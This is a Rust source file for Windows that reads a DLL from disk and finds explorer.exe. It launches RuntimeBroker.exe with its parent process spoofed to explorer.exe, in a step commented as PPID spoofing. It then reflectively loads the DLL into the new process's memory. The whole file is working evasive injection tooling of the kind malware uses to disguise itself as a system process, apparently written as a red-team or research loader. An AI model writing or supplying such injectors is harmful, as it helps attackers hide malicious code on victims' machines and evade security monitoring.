mod lib;
use crate::lib::*;
use std::fs;
use std::fs::File;
use std::io::Read;
use winapi::ctypes::c_void;

use std::ffi::{CStr, OsStr};
use std::mem;
use std::os::windows::ffi::OsStrExt;
use winapi::shared::minwindef::{DWORD, FALSE, TRUE};
use winapi::um::processthreadsapi::{
    CreateProcessW, InitializeProcThreadAttributeList, ResumeThread, UpdateProcThreadAttribute,
    LPPROC_THREAD_ATTRIBUTE_LIST, PROCESS_INFORMATION,
};
use winapi::um::processthreadsapi::{DeleteProcThreadAttributeList, OpenProcess};
use winapi::um::synchapi::Sleep;
use winapi::um::tlhelp32::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use winapi::um::winbase::{EXTENDED_STARTUPINFO_PRESENT, STARTUPINFOEXW};
use winapi::um::winnt::{HANDLE, MAXIMUM_ALLOWED, PVOID};

struct ProcessInfo {
    p_handle: HANDLE,
    _base_addr: u64,
}

fn get_file_as_byte_vec(filename: &String) -> Option<Vec<u8>> {
    println!("get_file_as_byte_vec ...");
    let mut f = match File::open(&filename) {
        Ok(file) => file,
        Err(_err) => return None,
    };
    let metadata = match fs::metadata(&filename) {
        Ok(m) => m,
        Err(_err) => return None,
    };
    let mut buffer = vec![0; metadata.len() as usize];
    match f.read(&mut buffer) {
        Ok(_) => return Some(buffer),
        Err(_err) => return None,
    };
}

fn read_payload() -> Option<Vec<u8>> {
    println!("read_payload ...");
    let filename = String::from("dummy_dll.dll");
    match get_file_as_byte_vec(&filename) {
        Some(buffer) => return Some(buffer),
        None => {
            println!("get_file_as_byte_vec failed");
            return None;
        }
    };
}

// Search for the pid by the name, then opens based on pid
unsafe fn find_proc_by_name(_proc_name: &str) -> Option<HANDLE> {
    // 1) CreateToolhelp32Snapshot
    // 2) Process32First
    // 3) OpenProcess
    let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    let mut target_pid: DWORD = 0;
    if snapshot == (0 as winapi::um::winnt::HANDLE) {
        return None;
    }
    let mut pe32 = PROCESSENTRY32 {
        dwSize: mem::size_of::<PROCESSENTRY32>() as DWORD,
        ..std::mem::zeroed::<PROCESSENTRY32>()
    };
    if Process32First(snapshot, &mut pe32) == 0 {
        return None;
    }
    loop {
        let process_name = pe32.szExeFile;
        let slice = CStr::from_ptr(process_name.as_ptr());
        let proc_name_str = slice.to_str().unwrap();
        if _proc_name.eq(proc_name_str) {
            target_pid = pe32.th32ProcessID;
            break;
        }
        if Process32Next(snapshot, &mut pe32) == 0 {
            break;
        }
    }
    if target_pid == (0 as DWORD) {
        return None;
    }
    // OpenProcess
    let process_handle = OpenProcess(MAXIMUM_ALLOWED, FALSE, target_pid);
    if process_handle != 0 as PVOID {
        return Some(process_handle);
    }
    None
}

// https://github.com/hniksic/rust-subprocess/blob/master/src/popen.rs
unsafe fn create_runtime_process() -> Option<ProcessInfo> {
    let _runtime_str_path = OsStr::new("C:\\Windows\\System32\\RuntimeBroker.exe");
    let runtime_str_arg = OsStr::new("C:\\Windows\\System32\\RuntimeBroker.exe -Embedding");
    let mut runtime_str_path_w = runtime_str_arg
        .encode_wide()
        .chain(Some(0))
        .collect::<Vec<_>>();
    let mut sinfo_ex: STARTUPINFOEXW = mem::zeroed();
    sinfo_ex.StartupInfo.cb = mem::size_of::<STARTUPINFOEXW>() as u32;

    // Find Explorer
    let explorer_handle = match find_proc_by_name("explorer.exe") {
        Some(handle) => handle,
        None => return None,
    };
    // PPID Spoofing
    // InitializeProcThreadAttributeList
    let mut lp_size: usize = 0;
    InitializeProcThreadAttributeList(std::ptr::null_mut(), 1, 0, &mut lp_size);
    if lp_size == 0 {
        //println!("InitializeProcThreadAttributeList failed");
        return None;
    }
    let mut lp_attribute_list: Box<[u8]> = vec![0; lp_size].into_boxed_slice();
    sinfo_ex.lpAttributeList =
        lp_attribute_list.as_mut_ptr().cast::<_>() as LPPROC_THREAD_ATTRIBUTE_LIST;
    let mut success =
        InitializeProcThreadAttributeList(sinfo_ex.lpAttributeList, 1, 0, &mut lp_size);
    if success == 0 {
        //println!("InitializeProcThreadAttributeList 2 failed");
        return None;
    }
    // UpdateProcThreadAttribute
    let len_pvoid = mem::size_of::<HANDLE>();
    let handle_mem: Box<HANDLE> = Box::new(explorer_handle); // malloc heap
    let raw_pointer_mut = &*handle_mem as *const HANDLE;
    success = UpdateProcThreadAttribute(
        sinfo_ex.lpAttributeList,
        0,
        0x20000,                  // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
        raw_pointer_mut as PVOID, // prochandle
        len_pvoid,
        std::ptr::null_mut(),
        std::ptr::null_mut(),
    );
    if success == 0 {
        //println!("UpdateProcThreadAttribute failed");
        return None;
    }
    let mut pinfo: PROCESS_INFORMATION = mem::zeroed();
    //https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw
    let ret = CreateProcessW(
        // [in, optional]      LPCWSTR               lpApplicationName,
        std::ptr::null_mut(),
        // [in, out, optional] LPWSTR                lpCommandLine,
        runtime_str_path_w.as_mut_ptr(),
        // [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
        std::ptr::null_mut(),
        // [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
        std::ptr::null_mut(),
        // [in]                BOOL                  bInheritHandles,
        TRUE,
        // [in]                DWORD                 dwCreationFlags,
        EXTENDED_STARTUPINFO_PRESENT, //Lazarus
        // [in, optional]      LPVOID                lpEnvironment,
        std::ptr::null_mut(),
        // [in, optional]      LPCWSTR               lpCurrentDirectory,
        std::ptr::null_mut(),
        // [in]                LPSTARTUPINFOW        lpStartupInfo,
        &mut sinfo_ex.StartupInfo,
        // [out]               LPPROCESS_INFORMATION lpProcessInformation
        &mut pinfo,
    );
    if ret == 0 {
        // panic!("Cannot create process: {}", Error::last_os_error());
        return None;
    }
    ResumeThread(pinfo.hThread);
    DeleteProcThreadAttributeList(sinfo_ex.lpAttributeList);
    Sleep(0x3E8);
    let p_info = ProcessInfo {
        p_handle: pinfo.hProcess,
        _base_addr: 0,
    };
    Some(p_info)
}

fn main() {
    let mut data = match read_payload() {
        Some(buffer) => buffer,
        None => {
            println!("failed to retrieve file data");
            return;
        }
    };

    let process_info = unsafe {
        match create_runtime_process() {
            Some(pinfo) => pinfo,
            None => return,
        }
    };
    //let handle = memory_loadlibary_remote(data.as_mut_ptr() as *mut c_void, data.len() as u32, NULL);
    let handle = _memory_loadlibary_remote(
        data.as_mut_ptr() as *mut c_void,
        data.len() as u32,
        process_info.p_handle,
    );
    if handle == 0 {
        println!("loading failed");
    }
    println!("Hello, world!");
}
